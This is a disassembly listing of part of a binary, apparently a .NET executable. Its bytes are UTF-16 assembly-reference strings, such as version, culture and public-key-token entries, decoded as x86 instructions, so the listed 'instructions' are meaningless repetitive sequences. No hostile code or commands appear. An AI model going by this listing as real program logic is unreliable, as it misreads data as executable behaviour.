  407167:	add    BYTE PTR [esi+0x0],ch
  40716a:	cmp    eax,0x30006200
  40716f:	add    BYTE PTR [ebx],dh
  407171:	add    BYTE PTR [esi+0x0],ah
  407174:	xor    eax,0x37006600
  407179:	add    BYTE PTR [esi+0x0],ah
  40717c:	xor    DWORD PTR [eax],eax
  40717e:	xor    DWORD PTR [eax],eax
  407180:	add    BYTE PTR fs:0x61003000,dh
  407187:	add    BYTE PTR [ebx],dh
  407189:	add    BYTE PTR [ecx+0x0],ah
  40718c:	cmp    BYTE PTR [edx+0x790053],0x73
  407193:	add    BYTE PTR [eax+eax*1+0x65],dh
  407197:	add    BYTE PTR [ebp+0x0],ch
  40719a:	add    BYTE PTR cs:[esi+0x0],cl
  40719e:	add    BYTE PTR gs:[eax+eax*1+0x2e],dh
  4071a3:	add    BYTE PTR [eax+0x0],cl
  4071a6:	je     0x4071a8
  4071a8:	je     0x4071aa
  4071aa:	jo     0x4071ac
  4071ac:	add    BYTE PTR cs:[edi+0x0],dl
  4071b0:	add    BYTE PTR gs:[edx+0x0],ah
  4071b4:	push   edx
  4071b5:	add    BYTE PTR [ebp+0x0],ah
  4071b8:	jno    0x4071ba
  4071ba:	jne    0x4071bc
  4071bc:	add    BYTE PTR gs:[ebx+0x0],dh
  4071c0:	je     0x4071c2
  4071c2:	sub    al,0x0
  4071c4:	and    BYTE PTR [eax],al
  4071c6:	push   esi
  4071c7:	add    BYTE PTR [ebp+0x0],ah
  4071ca:	jb     0x4071cc
  4071cc:	jae    0x4071ce
  4071ce:	imul   eax,DWORD PTR [eax],0x6e006f
  4071d4:	cmp    eax,0x2e003400
  4071d9:	add    BYTE PTR [eax],dh
  4071db:	add    BYTE PTR [esi],ch
  4071dd:	add    BYTE PTR [eax],dh
  4071df:	add    BYTE PTR [esi],ch
  4071e1:	add    BYTE PTR [eax],dh
  4071e3:	add    BYTE PTR [eax+eax*1],ch
  4071e6:	and    BYTE PTR [eax],al
  4071e8:	inc    ebx
  4071e9:	add    BYTE PTR [ebp+0x0],dh
  4071ec:	ins    BYTE PTR es:[edi],dx
  4071ed:	add    BYTE PTR [eax+eax*1+0x75],dh
  4071f1:	add    BYTE PTR [edx+0x0],dh
  4071f4:	add    BYTE PTR gs:0x65006e00,bh
  4071fb:	add    BYTE PTR [ebp+0x0],dh
  4071fe:	je     0x407200
  407200:	jb     0x407202
  407202:	popa   
  407203:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407207:	add    BYTE PTR [eax],ah
  407209:	add    BYTE PTR [eax+0x0],dl
  40720c:	jne    0x40720e
  40720e:	bound  eax,QWORD PTR [eax]
  407210:	ins    BYTE PTR es:[edi],dx
  407211:	add    BYTE PTR [ecx+0x0],ch
  407214:	arpl   WORD PTR [eax],ax
  407216:	dec    ebx
  407217:	add    BYTE PTR [ebp+0x0],ah
  40721a:	jns    0x40721c
  40721c:	push   esp
  40721d:	add    BYTE PTR [edi+0x0],ch
  407220:	imul   eax,DWORD PTR [eax],0x65
  407223:	add    BYTE PTR [esi+0x0],ch
  407226:	cmp    eax,0x30006200
  40722b:	add    BYTE PTR [ebx],dh
  40722d:	add    BYTE PTR [esi+0x0],ah
  407230:	xor    eax,0x37006600
  407235:	add    BYTE PTR [esi+0x0],ah
  407238:	xor    DWORD PTR [eax],eax
  40723a:	xor    DWORD PTR [eax],eax
  40723c:	add    BYTE PTR fs:0x61003000,dh
  407243:	add    BYTE PTR [ebx],dh
  407245:	add    BYTE PTR [ecx+0x0],ah
  407248:	sbb    dh,0x53
  40724b:	add    BYTE PTR [ecx+0x0],bh
  40724e:	jae    0x407250
  407250:	je     0x407252
  407252:	add    BYTE PTR gs:[ebp+0x0],ch
  407256:	add    BYTE PTR cs:[edx+0x0],dl
  40725a:	jne    0x40725c
  40725c:	outs   dx,BYTE PTR ds:[esi]
  40725d:	add    BYTE PTR [eax+eax*1+0x69],dh
  407261:	add    BYTE PTR [ebp+0x0],ch
  407264:	add    BYTE PTR gs:[esi],ch
  407267:	add    BYTE PTR [ebx+0x0],dl
  40726a:	add    BYTE PTR gs:[edx+0x0],dh
  40726e:	imul   eax,DWORD PTR [eax],0x6c0061
  407274:	imul   eax,DWORD PTR [eax],0x61007a
  40727a:	je     0x40727c
  40727c:	imul   eax,DWORD PTR [eax],0x6e006f
  407282:	add    BYTE PTR cs:[esi+0x0],al
  407286:	outs   dx,DWORD PTR ds:[esi]
  407287:	add    BYTE PTR [edx+0x0],dh
  40728a:	ins    DWORD PTR es:[edi],dx
  40728b:	add    BYTE PTR [ecx+0x0],ah
  40728e:	je     0x407290
  407290:	je     0x407292
  407292:	add    BYTE PTR gs:[edx+0x0],dh
  407296:	jae    0x407298
  407298:	add    BYTE PTR cs:[ebx+0x0],dl
  40729c:	outs   dx,DWORD PTR ds:[esi]
  40729d:	add    BYTE PTR [ecx+0x0],ah
  4072a0:	jo     0x4072a2
  4072a2:	sub    al,0x0
  4072a4:	and    BYTE PTR [eax],al
  4072a6:	push   esi
  4072a7:	add    BYTE PTR [ebp+0x0],ah
  4072aa:	jb     0x4072ac
  4072ac:	jae    0x4072ae
  4072ae:	imul   eax,DWORD PTR [eax],0x6e006f
  4072b4:	cmp    eax,0x2e003400
  4072b9:	add    BYTE PTR [eax],dh
  4072bb:	add    BYTE PTR [esi],ch
  4072bd:	add    BYTE PTR [eax],dh
  4072bf:	add    BYTE PTR [esi],ch
  4072c1:	add    BYTE PTR [eax],dh
  4072c3:	add    BYTE PTR [eax+eax*1],ch
  4072c6:	and    BYTE PTR [eax],al
  4072c8:	inc    ebx
  4072c9:	add    BYTE PTR [ebp+0x0],dh
  4072cc:	ins    BYTE PTR es:[edi],dx
  4072cd:	add    BYTE PTR [eax+eax*1+0x75],dh
  4072d1:	add    BYTE PTR [edx+0x0],dh
  4072d4:	add    BYTE PTR gs:0x65006e00,bh
  4072db:	add    BYTE PTR [ebp+0x0],dh
  4072de:	je     0x4072e0
  4072e0:	jb     0x4072e2
  4072e2:	popa   
  4072e3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4072e7:	add    BYTE PTR [eax],ah
  4072e9:	add    BYTE PTR [eax+0x0],dl
  4072ec:	jne    0x4072ee
  4072ee:	bound  eax,QWORD PTR [eax]
  4072f0:	ins    BYTE PTR es:[edi],dx
  4072f1:	add    BYTE PTR [ecx+0x0],ch
  4072f4:	arpl   WORD PTR [eax],ax
  4072f6:	dec    ebx
  4072f7:	add    BYTE PTR [ebp+0x0],ah
  4072fa:	jns    0x4072fc
  4072fc:	push   esp
  4072fd:	add    BYTE PTR [edi+0x0],ch
  407300:	imul   eax,DWORD PTR [eax],0x65
  407303:	add    BYTE PTR [esi+0x0],ch
  407306:	cmp    eax,0x30006200
  40730b:	add    BYTE PTR [ebx],dh
  40730d:	add    BYTE PTR [esi+0x0],ah
  407310:	xor    eax,0x37006600
  407315:	add    BYTE PTR [esi+0x0],ah
  407318:	xor    DWORD PTR [eax],eax
  40731a:	xor    DWORD PTR [eax],eax
  40731c:	add    BYTE PTR fs:0x61003000,dh
  407323:	add    BYTE PTR [ebx],dh
  407325:	add    BYTE PTR [ecx+0x0],ah
  407328:	add    al,0x53
  40732b:	add    BYTE PTR [ecx+0x0],bh
  40732e:	jae    0x407330
  407330:	je     0x407332
  407332:	add    BYTE PTR gs:[ebp+0x0],ch
  407336:	add    BYTE PTR cs:[edx+0x0],dl
  40733a:	jne    0x40733c
  40733c:	outs   dx,BYTE PTR ds:[esi]
  40733d:	add    BYTE PTR [eax+eax*1+0x69],dh
  407341:	add    BYTE PTR [ebp+0x0],ch
  407344:	add    BYTE PTR gs:[esi],ch
  407347:	add    BYTE PTR [edi+0x0],dl
  40734a:	imul   eax,DWORD PTR [eax],0x64006e
  407350:	outs   dx,DWORD PTR ds:[esi]
  407351:	add    BYTE PTR [edi+0x0],dh
  407354:	jae    0x407356
  407356:	push   edx
  407357:	add    BYTE PTR [ebp+0x0],dh
  40735a:	outs   dx,BYTE PTR ds:[esi]
  40735b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40735f:	add    BYTE PTR [ebp+0x0],ch
  407362:	add    BYTE PTR gs:[eax+eax*1],ch
  407366:	and    BYTE PTR [eax],al
  407368:	push   esi
  407369:	add    BYTE PTR [ebp+0x0],ah
  40736c:	jb     0x40736e
  40736e:	jae    0x407370
  407370:	imul   eax,DWORD PTR [eax],0x6e006f
  407376:	cmp    eax,0x2e003400
  40737b:	add    BYTE PTR [eax],dh
  40737d:	add    BYTE PTR [esi],ch
  40737f:	add    BYTE PTR [eax],dh
  407381:	add    BYTE PTR [esi],ch
  407383:	add    BYTE PTR [eax],dh
  407385:	add    BYTE PTR [eax+eax*1],ch
  407388:	and    BYTE PTR [eax],al
  40738a:	inc    ebx
  40738b:	add    BYTE PTR [ebp+0x0],dh
  40738e:	ins    BYTE PTR es:[edi],dx
  40738f:	add    BYTE PTR [eax+eax*1+0x75],dh
  407393:	add    BYTE PTR [edx+0x0],dh
  407396:	add    BYTE PTR gs:0x65006e00,bh
  40739d:	add    BYTE PTR [ebp+0x0],dh
  4073a0:	je     0x4073a2
  4073a2:	jb     0x4073a4
  4073a4:	popa   
  4073a5:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4073a9:	add    BYTE PTR [eax],ah
  4073ab:	add    BYTE PTR [eax+0x0],dl
  4073ae:	jne    0x4073b0
  4073b0:	bound  eax,QWORD PTR [eax]
  4073b2:	ins    BYTE PTR es:[edi],dx
  4073b3:	add    BYTE PTR [ecx+0x0],ch
  4073b6:	arpl   WORD PTR [eax],ax
  4073b8:	dec    ebx
  4073b9:	add    BYTE PTR [ebp+0x0],ah
  4073bc:	jns    0x4073be
  4073be:	push   esp
  4073bf:	add    BYTE PTR [edi+0x0],ch
  4073c2:	imul   eax,DWORD PTR [eax],0x65
  4073c5:	add    BYTE PTR [esi+0x0],ch
  4073c8:	cmp    eax,0x37006200
  4073cd:	add    BYTE PTR [edi],dh
  4073cf:	add    BYTE PTR [ecx+0x0],ah
  4073d2:	xor    eax,0x35006300
  4073d7:	add    BYTE PTR [esi],dh
  4073d9:	add    BYTE PTR [ecx],dh
  4073db:	add    BYTE PTR [ecx],bh
  4073dd:	add    BYTE PTR [ebx],dh
  4073df:	add    BYTE PTR [eax+eax*1],dh
  4073e2:	add    BYTE PTR gs:[eax],dh
  4073e5:	add    BYTE PTR [eax],bh
  4073e7:	add    BYTE PTR [ecx],bh
  4073e9:	add    BYTE PTR [eax+0x790053cc],al
  4073ef:	add    BYTE PTR [ebx+0x0],dh
  4073f2:	je     0x4073f4
  4073f4:	add    BYTE PTR gs:[ebp+0x0],ch
  4073f8:	add    BYTE PTR cs:[edx+0x0],dl
  4073fc:	jne    0x4073fe
  4073fe:	outs   dx,BYTE PTR ds:[esi]
  4073ff:	add    BYTE PTR [eax+eax*1+0x69],dh
  407403:	add    BYTE PTR [ebp+0x0],ch
  407406:	add    BYTE PTR gs:[esi],ch
  407409:	add    BYTE PTR [edi+0x0],dl
  40740c:	imul   eax,DWORD PTR [eax],0x64006e
  407412:	outs   dx,DWORD PTR ds:[esi]
  407413:	add    BYTE PTR [edi+0x0],dh
  407416:	jae    0x407418
  407418:	push   edx
  407419:	add    BYTE PTR [ebp+0x0],dh
  40741c:	outs   dx,BYTE PTR ds:[esi]
  40741d:	add    BYTE PTR [eax+eax*1+0x69],dh
  407421:	add    BYTE PTR [ebp+0x0],ch
  407424:	add    BYTE PTR gs:[ebp+0x0],dl
  407428:	dec    ecx
  407429:	add    BYTE PTR [eax+0x0],bl
  40742c:	popa   
  40742d:	add    BYTE PTR [ebp+0x0],ch
  407430:	ins    BYTE PTR es:[edi],dx
  407431:	add    BYTE PTR [eax+eax*1],ch
  407434:	and    BYTE PTR [eax],al
  407436:	push   esi
  407437:	add    BYTE PTR [ebp+0x0],ah
  40743a:	jb     0x40743c
  40743c:	jae    0x40743e
  40743e:	imul   eax,DWORD PTR [eax],0x6e006f
  407444:	cmp    eax,0x2e003400
  407449:	add    BYTE PTR [eax],dh
  40744b:	add    BYTE PTR [esi],ch
  40744d:	add    BYTE PTR [eax],dh
  40744f:	add    BYTE PTR [esi],ch
  407451:	add    BYTE PTR [eax],dh
  407453:	add    BYTE PTR [eax+eax*1],ch
  407456:	and    BYTE PTR [eax],al
  407458:	inc    ebx
  407459:	add    BYTE PTR [ebp+0x0],dh
  40745c:	ins    BYTE PTR es:[edi],dx
  40745d:	add    BYTE PTR [eax+eax*1+0x75],dh
  407461:	add    BYTE PTR [edx+0x0],dh
  407464:	add    BYTE PTR gs:0x65006e00,bh
  40746b:	add    BYTE PTR [ebp+0x0],dh
  40746e:	je     0x407470
  407470:	jb     0x407472
  407472:	popa   
  407473:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407477:	add    BYTE PTR [eax],ah
  407479:	add    BYTE PTR [eax+0x0],dl
  40747c:	jne    0x40747e
  40747e:	bound  eax,QWORD PTR [eax]
  407480:	ins    BYTE PTR es:[edi],dx
  407481:	add    BYTE PTR [ecx+0x0],ch
  407484:	arpl   WORD PTR [eax],ax
  407486:	dec    ebx
  407487:	add    BYTE PTR [ebp+0x0],ah
  40748a:	jns    0x40748c
  40748c:	push   esp
  40748d:	add    BYTE PTR [edi+0x0],ch
  407490:	imul   eax,DWORD PTR [eax],0x65
  407493:	add    BYTE PTR [esi+0x0],ch
  407496:	cmp    eax,0x37006200
  40749b:	add    BYTE PTR [edi],dh
  40749d:	add    BYTE PTR [ecx+0x0],ah
  4074a0:	xor    eax,0x35006300
  4074a5:	add    BYTE PTR [esi],dh
  4074a7:	add    BYTE PTR [ecx],dh
  4074a9:	add    BYTE PTR [ecx],bh
  4074ab:	add    BYTE PTR [ebx],dh
  4074ad:	add    BYTE PTR [eax+eax*1],dh
  4074b0:	add    BYTE PTR gs:[eax],dh
  4074b3:	add    BYTE PTR [eax],bh
  4074b5:	add    BYTE PTR [ecx],bh
  4074b7:	add    BYTE PTR [eax+0x790053a4],al
  4074bd:	add    BYTE PTR [ebx+0x0],dh
  4074c0:	je     0x4074c2
  4074c2:	add    BYTE PTR gs:[ebp+0x0],ch
  4074c6:	add    BYTE PTR cs:[ebx+0x0],dl
  4074ca:	add    BYTE PTR gs:[ebx+0x0],ah
  4074ce:	jne    0x4074d0
  4074d0:	jb     0x4074d2
  4074d2:	imul   eax,DWORD PTR [eax],0x790074
  4074d8:	sub    al,0x0
  4074da:	and    BYTE PTR [eax],al
  4074dc:	push   esi
  4074dd:	add    BYTE PTR [ebp+0x0],ah
  4074e0:	jb     0x4074e2
  4074e2:	jae    0x4074e4
  4074e4:	imul   eax,DWORD PTR [eax],0x6e006f
  4074ea:	cmp    eax,0x2e003400
  4074ef:	add    BYTE PTR [eax],dh
  4074f1:	add    BYTE PTR [esi],ch
  4074f3:	add    BYTE PTR [eax],dh
  4074f5:	add    BYTE PTR [esi],ch
  4074f7:	add    BYTE PTR [eax],dh
  4074f9:	add    BYTE PTR [eax+eax*1],ch
  4074fc:	and    BYTE PTR [eax],al
  4074fe:	inc    ebx
  4074ff:	add    BYTE PTR [ebp+0x0],dh
  407502:	ins    BYTE PTR es:[edi],dx
  407503:	add    BYTE PTR [eax+eax*1+0x75],dh
  407507:	add    BYTE PTR [edx+0x0],dh
  40750a:	add    BYTE PTR gs:0x65006e00,bh
  407511:	add    BYTE PTR [ebp+0x0],dh
  407514:	je     0x407516
  407516:	jb     0x407518
  407518:	popa   
  407519:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40751d:	add    BYTE PTR [eax],ah
  40751f:	add    BYTE PTR [eax+0x0],dl
  407522:	jne    0x407524
  407524:	bound  eax,QWORD PTR [eax]
  407526:	ins    BYTE PTR es:[edi],dx
  407527:	add    BYTE PTR [ecx+0x0],ch
  40752a:	arpl   WORD PTR [eax],ax
  40752c:	dec    ebx
  40752d:	add    BYTE PTR [ebp+0x0],ah
  407530:	jns    0x407532
  407532:	push   esp
  407533:	add    BYTE PTR [edi+0x0],ch
  407536:	imul   eax,DWORD PTR [eax],0x65
  407539:	add    BYTE PTR [esi+0x0],ch
  40753c:	cmp    eax,0x30006200
  407541:	add    BYTE PTR [ebx],dh
  407543:	add    BYTE PTR [esi+0x0],ah
  407546:	xor    eax,0x37006600
  40754b:	add    BYTE PTR [esi+0x0],ah
  40754e:	xor    DWORD PTR [eax],eax
  407550:	xor    DWORD PTR [eax],eax
  407552:	add    BYTE PTR fs:0x61003000,dh
  407559:	add    BYTE PTR [ebx],dh
  40755b:	add    BYTE PTR [ecx+0x0],ah
  40755e:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  407566:	je     0x407568
  407568:	add    BYTE PTR gs:[ebp+0x0],ch
  40756c:	add    BYTE PTR cs:[ebx+0x0],dl
  407570:	add    BYTE PTR gs:[edx+0x0],dh
  407574:	jbe    0x407576
  407576:	imul   eax,DWORD PTR [eax],0x650063
  40757c:	dec    ebp
  40757d:	add    BYTE PTR [edi+0x0],ch
  407580:	add    BYTE PTR fs:[ebp+0x0],ah
  407584:	ins    BYTE PTR es:[edi],dx
  407585:	add    BYTE PTR [esi],ch
  407587:	add    BYTE PTR [edi+0x0],dl
  40758a:	add    BYTE PTR gs:[edx+0x0],ah
  40758e:	sub    al,0x0
  407590:	and    BYTE PTR [eax],al
  407592:	push   esi
  407593:	add    BYTE PTR [ebp+0x0],ah
  407596:	jb     0x407598
  407598:	jae    0x40759a
  40759a:	imul   eax,DWORD PTR [eax],0x6e006f
  4075a0:	cmp    eax,0x2e003400
  4075a5:	add    BYTE PTR [eax],dh
  4075a7:	add    BYTE PTR [esi],ch
  4075a9:	add    BYTE PTR [eax],dh
  4075ab:	add    BYTE PTR [esi],ch
  4075ad:	add    BYTE PTR [eax],dh
  4075af:	add    BYTE PTR [eax+eax*1],ch
  4075b2:	and    BYTE PTR [eax],al
  4075b4:	inc    ebx
  4075b5:	add    BYTE PTR [ebp+0x0],dh
  4075b8:	ins    BYTE PTR es:[edi],dx
  4075b9:	add    BYTE PTR [eax+eax*1+0x75],dh
  4075bd:	add    BYTE PTR [edx+0x0],dh
  4075c0:	add    BYTE PTR gs:0x65006e00,bh
  4075c7:	add    BYTE PTR [ebp+0x0],dh
  4075ca:	je     0x4075cc
  4075cc:	jb     0x4075ce
  4075ce:	popa   
  4075cf:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4075d3:	add    BYTE PTR [eax],ah
  4075d5:	add    BYTE PTR [eax+0x0],dl
  4075d8:	jne    0x4075da
  4075da:	bound  eax,QWORD PTR [eax]
  4075dc:	ins    BYTE PTR es:[edi],dx
  4075dd:	add    BYTE PTR [ecx+0x0],ch
  4075e0:	arpl   WORD PTR [eax],ax
  4075e2:	dec    ebx
  4075e3:	add    BYTE PTR [ebp+0x0],ah
  4075e6:	jns    0x4075e8
  4075e8:	push   esp
  4075e9:	add    BYTE PTR [edi+0x0],ch
  4075ec:	imul   eax,DWORD PTR [eax],0x65
  4075ef:	add    BYTE PTR [esi+0x0],ch
  4075f2:	cmp    eax,0x31003300
  4075f7:	add    BYTE PTR [edx+0x0],ah
  4075fa:	data16 add BYTE PTR [ebx],dh
  4075fd:	add    BYTE PTR [eax],bh
  4075ff:	add    BYTE PTR ds:0x61003600,dh
  407605:	add    BYTE PTR [eax+eax*1+0x33],ah
  407609:	add    BYTE PTR [esi],dh
  40760b:	add    BYTE PTR [eax+eax*1],dh
  40760e:	add    BYTE PTR gs:[ebx],dh
  407611:	add    BYTE PTR ds:0x53b08000,dh
  407617:	add    BYTE PTR [ecx+0x0],bh
  40761a:	jae    0x40761c
  40761c:	je     0x40761e
  40761e:	add    BYTE PTR gs:[ebp+0x0],ch
  407622:	add    BYTE PTR cs:[ebx+0x0],dl
  407626:	add    BYTE PTR gs:[edx+0x0],dh
  40762a:	jbe    0x40762c
  40762c:	imul   eax,DWORD PTR [eax],0x650063
  407632:	push   eax
  407633:	add    BYTE PTR [edx+0x0],dh
  407636:	outs   dx,DWORD PTR ds:[esi]
  407637:	add    BYTE PTR [ebx+0x0],ah
  40763a:	add    BYTE PTR gs:[ebx+0x0],dh
  40763e:	jae    0x407640
  407640:	sub    al,0x0
  407642:	and    BYTE PTR [eax],al
  407644:	push   esi
  407645:	add    BYTE PTR [ebp+0x0],ah
  407648:	jb     0x40764a
  40764a:	jae    0x40764c
  40764c:	imul   eax,DWORD PTR [eax],0x6e006f
  407652:	cmp    eax,0x2e003400
  407657:	add    BYTE PTR [eax],dh
  407659:	add    BYTE PTR [esi],ch
  40765b:	add    BYTE PTR [eax],dh
  40765d:	add    BYTE PTR [esi],ch
  40765f:	add    BYTE PTR [eax],dh
  407661:	add    BYTE PTR [eax+eax*1],ch
  407664:	and    BYTE PTR [eax],al
  407666:	inc    ebx
  407667:	add    BYTE PTR [ebp+0x0],dh
  40766a:	ins    BYTE PTR es:[edi],dx
  40766b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40766f:	add    BYTE PTR [edx+0x0],dh
  407672:	add    BYTE PTR gs:0x65006e00,bh
  407679:	add    BYTE PTR [ebp+0x0],dh
  40767c:	je     0x40767e
  40767e:	jb     0x407680
  407680:	popa   
  407681:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407685:	add    BYTE PTR [eax],ah
  407687:	add    BYTE PTR [eax+0x0],dl
  40768a:	jne    0x40768c
  40768c:	bound  eax,QWORD PTR [eax]
  40768e:	ins    BYTE PTR es:[edi],dx
  40768f:	add    BYTE PTR [ecx+0x0],ch
  407692:	arpl   WORD PTR [eax],ax
  407694:	dec    ebx
  407695:	add    BYTE PTR [ebp+0x0],ah
  407698:	jns    0x40769a
  40769a:	push   esp
  40769b:	add    BYTE PTR [edi+0x0],ch
  40769e:	imul   eax,DWORD PTR [eax],0x65
  4076a1:	add    BYTE PTR [esi+0x0],ch
  4076a4:	cmp    eax,0x30006200
  4076a9:	add    BYTE PTR [ebx],dh
  4076ab:	add    BYTE PTR [esi+0x0],ah
  4076ae:	xor    eax,0x37006600
  4076b3:	add    BYTE PTR [esi+0x0],ah
  4076b6:	xor    DWORD PTR [eax],eax
  4076b8:	xor    DWORD PTR [eax],eax
  4076ba:	add    BYTE PTR fs:0x61003000,dh
  4076c1:	add    BYTE PTR [ebx],dh
  4076c3:	add    BYTE PTR [ecx+0x0],ah
  4076c6:	sbb    BYTE PTR [edx+0x790053],0x73
  4076cd:	add    BYTE PTR [eax+eax*1+0x65],dh
  4076d1:	add    BYTE PTR [ebp+0x0],ch
  4076d4:	add    BYTE PTR cs:[edi+0x0],dl
  4076d8:	add    BYTE PTR gs:[edx+0x0],ah
  4076dc:	sub    al,0x0
  4076de:	and    BYTE PTR [eax],al
  4076e0:	push   esi
  4076e1:	add    BYTE PTR [ebp+0x0],ah
  4076e4:	jb     0x4076e6
  4076e6:	jae    0x4076e8
  4076e8:	imul   eax,DWORD PTR [eax],0x6e006f
  4076ee:	cmp    eax,0x2e003400
  4076f3:	add    BYTE PTR [eax],dh
  4076f5:	add    BYTE PTR [esi],ch
  4076f7:	add    BYTE PTR [eax],dh
  4076f9:	add    BYTE PTR [esi],ch
  4076fb:	add    BYTE PTR [eax],dh
  4076fd:	add    BYTE PTR [eax+eax*1],ch
  407700:	and    BYTE PTR [eax],al
  407702:	inc    ebx
  407703:	add    BYTE PTR [ebp+0x0],dh
  407706:	ins    BYTE PTR es:[edi],dx
  407707:	add    BYTE PTR [eax+eax*1+0x75],dh
  40770b:	add    BYTE PTR [edx+0x0],dh
  40770e:	add    BYTE PTR gs:0x65006e00,bh
  407715:	add    BYTE PTR [ebp+0x0],dh
  407718:	je     0x40771a
  40771a:	jb     0x40771c
  40771c:	popa   
  40771d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  407721:	add    BYTE PTR [eax],ah
  407723:	add    BYTE PTR [eax+0x0],dl
  407726:	jne    0x407728
  407728:	bound  eax,QWORD PTR [eax]
  40772a:	ins    BYTE PTR es:[edi],dx
  40772b:	add    BYTE PTR [ecx+0x0],ch
  40772e:	arpl   WORD PTR [eax],ax
  407730:	dec    ebx
  407731:	add    BYTE PTR [ebp+0x0],ah
  407734:	jns    0x407736
  407736:	push   esp
  407737:	add    BYTE PTR [edi+0x0],ch
  40773a:	imul   eax,DWORD PTR [eax],0x65
  40773d:	add    BYTE PTR [esi+0x0],ch
  407740:	cmp    eax,0x30006200
  407745:	add    BYTE PTR [ebx],dh
  407747:	add    BYTE PTR [esi+0x0],ah
  40774a:	xor    eax,0x37006600
  40774f:	add    BYTE PTR [esi+0x0],ah
  407752:	xor    DWORD PTR [eax],eax
  407754:	xor    DWORD PTR [eax],eax
  407756:	add    BYTE PTR fs:0x61003000,dh
  40775d:	add    BYTE PTR [ebx],dh
  40775f:	add    BYTE PTR [ecx+0x0],ah
  407762:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  40776a:	je     0x40776c
  40776c:	add    BYTE PTR gs:[ebp+0x0],ch
  407770:	add    BYTE PTR cs:[edi+0x0],dl
  407774:	add    BYTE PTR gs:[edx+0x0],ah
  407778:	add    BYTE PTR cs:[ecx+0x0],al
  40777c:	bound  eax,QWORD PTR [eax]
  40777e:	jae    0x407780
  407780:	je     0x407782
  407782:	jb     0x407784
  407784:	popa   
  407785:	add    BYTE PTR [ebx+0x0],ah
  407788:	je     0x40778a
  40778a:	imul   eax,DWORD PTR [eax],0x6e006f
  407790:	jae    0x407792
  407792:	sub    al,0x0
  407794:	and    BYTE PTR [eax],al
  407796:	push   esi
  407797:	add    BYTE PTR [ebp+0x0],ah
  40779a:	jb     0x40779c
  40779c:	jae    0x40779e
  40779e:	imul   eax,DWORD PTR [eax],0x6e006f
  4077a4:	cmp    eax,0x2e003400
  4077a9:	add    BYTE PTR [eax],dh
  4077ab:	add    BYTE PTR [esi],ch
  4077ad:	add    BYTE PTR [eax],dh
  4077af:	add    BYTE PTR [esi],ch
  4077b1:	add    BYTE PTR [eax],dh
  4077b3:	add    BYTE PTR [eax+eax*1],ch
  4077b6:	and    BYTE PTR [eax],al
  4077b8:	inc    ebx
  4077b9:	add    BYTE PTR [ebp+0x0],dh
  4077bc:	ins    BYTE PTR es:[edi],dx
  4077bd:	add    BYTE PTR [eax+eax*1+0x75],dh
  4077c1:	add    BYTE PTR [edx+0x0],dh
  4077c4:	add    BYTE PTR gs:0x65006e00,bh
  4077cb:	add    BYTE PTR [ebp+0x0],dh
  4077ce:	je     0x4077d0
  4077d0:	jb     0x4077d2
  4077d2:	popa   
  4077d3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4077d7:	add    BYTE PTR [eax],ah
  4077d9:	add    BYTE PTR [eax+0x0],dl
  4077dc:	jne    0x4077de
  4077de:	bound  eax,QWORD PTR [eax]
  4077e0:	ins    BYTE PTR es:[edi],dx
  4077e1:	add    BYTE PTR [ecx+0x0],ch
  4077e4:	arpl   WORD PTR [eax],ax
  4077e6:	dec    ebx
  4077e7:	add    BYTE PTR [ebp+0x0],ah
  4077ea:	jns    0x4077ec
  4077ec:	push   esp
  4077ed:	add    BYTE PTR [edi+0x0],ch
  4077f0:	imul   eax,DWORD PTR [eax],0x65
  4077f3:	add    BYTE PTR [esi+0x0],ch
  4077f6:	cmp    eax,0x31003300
  4077fb:	add    BYTE PTR [edx+0x0],ah
  4077fe:	data16 add BYTE PTR [ebx],dh
  407801:	add    BYTE PTR [eax],bh
  407803:	add    BYTE PTR ds:0x61003600,dh
  407809:	add    BYTE PTR [eax+eax*1+0x33],ah
  40780d:	add    BYTE PTR [esi],dh
  40780f:	add    BYTE PTR [eax+eax*1],dh
  407812:	add    BYTE PTR gs:[ebx],dh
  407815:	add    BYTE PTR ds:0x53b28000,dh
  40781b:	add    BYTE PTR [ecx+0x0],bh
  40781e:	jae    0x407820
  407820:	je     0x407822
  407822:	add    BYTE PTR gs:[ebp+0x0],ch
  407826:	add    BYTE PTR cs:[edi+0x0],dl
  40782a:	add    BYTE PTR gs:[edx+0x0],ah
  40782e:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  407833:	add    BYTE PTR [esi+0x0],ch
  407836:	popa   
  407837:	add    BYTE PTR [ebp+0x0],ch
  40783a:	imul   eax,DWORD PTR [eax],0x440063
  407840:	popa   
  407841:	add    BYTE PTR [eax+eax*1+0x61],dh
  407845:	add    BYTE PTR [eax+eax*1],ch
  407848:	and    BYTE PTR [eax],al
  40784a:	push   esi
  40784b:	add    BYTE PTR [ebp+0x0],ah
  40784e:	jb     0x407850
  407850:	jae    0x407852
  407852:	imul   eax,DWORD PTR [eax],0x6e006f
  407858:	cmp    eax,0x2e003400
  40785d:	add    BYTE PTR [eax],dh
  40785f:	add    BYTE PTR [esi],ch
  407861:	add    BYTE PTR [eax],dh
  407863:	add    BYTE PTR [esi],ch
  407865:	add    BYTE PTR [eax],dh
  407867:	add    BYTE PTR [eax+eax*1],ch
  40786a:	and    BYTE PTR [eax],al
  40786c:	inc    ebx
  40786d:	add    BYTE PTR [ebp+0x0],dh
  407870:	ins    BYTE PTR es:[edi],dx
  407871:	add    BYTE PTR [eax+eax*1+0x75],dh
  407875:	add    BYTE PTR [edx+0x0],dh
  407878:	add    BYTE PTR gs:0x65006e00,bh
  40787f:	add    BYTE PTR [ebp+0x0],dh
  407882:	je     0x407884
  407884:	jb     0x407886
  407886:	popa   
  407887:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40788b:	add    BYTE PTR [eax],ah
  40788d:	add    BYTE PTR [eax+0x0],dl
  407890:	jne    0x407892
  407892:	bound  eax,QWORD PTR [eax]
  407894:	ins    BYTE PTR es:[edi],dx
  407895:	add    BYTE PTR [ecx+0x0],ch
  407898:	arpl   WORD PTR [eax],ax
  40789a:	dec    ebx
  40789b:	add    BYTE PTR [ebp+0x0],ah
